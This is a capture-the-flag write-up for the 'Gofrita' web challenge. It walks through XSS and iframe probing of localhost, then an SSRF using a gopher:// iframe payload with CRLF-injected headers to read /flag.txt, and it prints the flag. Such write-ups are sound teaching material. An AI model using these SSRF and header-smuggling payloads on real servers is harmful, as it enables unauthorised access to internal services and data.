# 『Gofrita』

<img width="1000" height="521" alt="image" src="https://github.com/user-attachments/assets/4d09695a-05d6-4d9c-8324-98ce62d6e1cd" />

# 『Challenge Overview』

This is blind, but not very blind. Here is source code from inspect:
- [index.html](https://github.com/Lunalight-Yui/CTF/blob/main/2025/Nexhunt/Gofrita/source/code/index.html)

# 『Solving Challenge』
> Solved by Kokon then Lyra

First thing first, i though that XSS. I try using alert(1) and it work and send using fetch to my webhook, but it didn't give me any flag at all.
So i try to work with my friends to figure it out how to solve it.

Using `<iframe src="(your link)"></iframe>` it will show anything on that domain, but i curious with using localip.

# 『The Issue』

This is the first issue:

<img width="585" height="205" alt="image" src="https://github.com/user-attachments/assets/1bd80c87-7615-40ec-b8de-31980a840c80" />

The second one using `<iframe src="http://127.0.0.1:3333/flag.txt"></iframe>`:
<img width="1478" height="792" alt="image" src="https://github.com/user-attachments/assets/46c93f3d-290a-49d6-8812-392948692ab7" />

The third one using host url: 

<img width="1478" height="746" alt="image" src="https://github.com/user-attachments/assets/1fd78d9d-cf14-422c-8694-e2b8543cd90d" />

# 『Solution』

From this, my friend who was on my team suggest it using `gopher protocol`. So i try to search it how gopher protocol works.

The payload of gopher method that i know from internet should be like this:

```
gopher:(target link):(port)/_(method)
```

So giving this information, i use payload like this `<iframe src="gopher://ctf.nexus-security.club:3333/_GET /flag.txt"></iframe>` and here the result:

<img width="1492" height="802" alt="image" src="https://github.com/user-attachments/assets/9c02a796-222e-437b-b166-25bde8266cd8" />

Here are the another result if you let `"></iframe>` blank space on 1 line:

<img width="1489" height="742" alt="image" src="https://github.com/user-attachments/assets/fcdec09e-70ea-4767-bc1a-f71f2882ea81" />

And my friend got the right payload. Here are the result:

<img width="1491" height="799" alt="image" src="https://github.com/user-attachments/assets/953356ce-896a-4f89-9c2b-d4142cbea0d9" />

The payload:
```
<iframe src="gopher://127.0.0.1:3333/_GET /ammmmmmmmmm HTTP/1.1%0D%0AHost: 127.0.0.1%0D%0AX-Original-URL: /flag.txt%0D%0AX-Dev: 1%0D%0A%0D%0A"></iframe>
```

# 『Flag Format』
```
nexus{G0pher_with_55rf_is_fuuuuuuuun!}
```

# 『Reference』

- https://infosecwriteups.com/how-gopher-works-in-escalating-ssrfs-ce6e5459b630
- https://medium.com/@zoningxtr/ultimate-guide-to-gopher-protocol-from-basics-to-real-exploits-ed2fb788d8e0

Shout out to my friend `kokon` who solve this challenge and help me to understand using right path and giving the information using this 2 references
